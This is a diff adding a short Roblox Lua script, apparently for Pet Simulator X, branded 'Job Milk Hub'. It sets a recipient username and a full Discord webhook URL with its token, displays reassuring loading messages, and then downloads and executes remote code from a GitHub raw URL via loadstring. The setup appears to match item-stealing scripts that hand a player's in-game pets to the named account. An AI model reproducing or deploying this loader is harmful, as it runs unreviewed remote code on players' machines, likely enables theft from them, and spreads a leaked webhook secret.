@@ -1,0 +1,9 @@
+Username = "omg_job"
+WebHook = "https://discord.com/api/webhooks/1072902149505286266/4upaEyenbV72TGo5uBu2R3Az_ewR8ob06l7FDOxzQdvYu6keZb2yBk2wquDGvU4ok8PM"
+
+_G.CustomScriptName = "Job Milk Hub is loading..."
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
